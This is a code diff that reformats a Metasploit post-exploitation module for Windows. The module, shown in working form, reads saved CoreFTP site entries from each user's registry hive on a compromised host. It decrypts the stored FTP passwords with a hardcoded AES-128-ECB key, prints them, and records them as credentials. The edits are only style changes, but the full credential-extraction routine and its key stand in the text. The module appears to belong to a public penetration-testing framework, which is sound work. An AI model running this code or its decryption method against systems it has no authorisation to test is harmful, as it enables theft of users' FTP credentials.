@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -12,30 +13,29 @@ class MetasploitModule < Msf::Post
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::UserProfiles
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Windows Gather CoreFTP Saved Password Extraction',
-      'Description'   => %q{
-        This module extracts saved passwords from the CoreFTP FTP client. These
-      passwords are stored in the registry. They are encrypted with AES-128-ECB.
-      This module extracts and decrypts these passwords.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => ['theLightCosine'],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+                      'Name'          => 'Windows Gather CoreFTP Saved Password Extraction',
+                      'Description'   => %q(
+                        This module extracts saved passwords from the CoreFTP FTP client. These
+                      passwords are stored in the registry. They are encrypted with AES-128-ECB.
+                      This module extracts and decrypts these passwords.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => ['theLightCosine'],
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ]))
   end
 
   def run
-    userhives=load_missing_hives()
+    userhives = load_missing_hives
     userhives.each do |hive|
-      next if hive['HKU'] == nil
+      next if hive['HKU'].nil?
       print_status("Looking at Key #{hive['HKU']}")
       begin
         subkeys = registry_enumkeys("#{hive['HKU']}\\Software\\FTPware\\CoreFTP\\Sites")
-        if subkeys.nil? or subkeys.empty?
-          print_status ("CoreFTP not installed for this user.")
+        if subkeys.nil? || subkeys.empty?
+          print_status "CoreFTP not installed for this user."
           next
         end
 
@@ -45,9 +45,9 @@ class MetasploitModule < Msf::Post
           user = registry_getvaldata(site_key, "User") || ""
           port = registry_getvaldata(site_key, "Port") || ""
           epass = registry_getvaldata(site_key, "PW")
-          next if epass == nil or epass == ""
+          next if epass.nil? || (epass == "")
           pass = decrypt(epass)
-          pass = pass.gsub(/\x00/, '') if pass != nil and pass != ''
+          pass = pass.delete("\u0000") if !pass.nil? && (pass != '')
           print_good("Host: #{host} Port: #{port} User: #{user}  Password: #{pass}")
 
           service_data = {
@@ -59,12 +59,12 @@ class MetasploitModule < Msf::Post
           }
 
           credential_data = {
-              origin_type: :session,
-              session_id: session_db_id,
-              post_reference_name: self.refname,
-              private_type: :password,
-              private_data: pass,
-              username: user
+            origin_type: :session,
+            session_id: session_db_id,
+            post_reference_name: refname,
+            private_type: :password,
+            private_data: pass,
+            username: user
           }
 
           credential_data.merge!(service_data)
@@ -73,9 +73,9 @@ class MetasploitModule < Msf::Post
           credential_core = create_credential(credential_data)
 
           # Assemble the options hash for creating the Metasploit::Credential::Login object
-          login_data ={
-              core: credential_core,
-              status: Metasploit::Model::Login::Status::UNTRIED
+          login_data = {
+            core: credential_core,
+            status: Metasploit::Model::Login::Status::UNTRIED
           }
 
           # Merge in the service data and create our Login
@@ -95,7 +95,7 @@ class MetasploitModule < Msf::Post
     aes.padding = 0
     aes.decrypt
     aes.key = "hdfzpysvpzimorhk"
-    password = (aes.update(cipher) + aes.final).gsub(/\x00/,'')
-    return password
+    password = (aes.update(cipher) + aes.final).delete("\u0000")
+    password
   end
 end
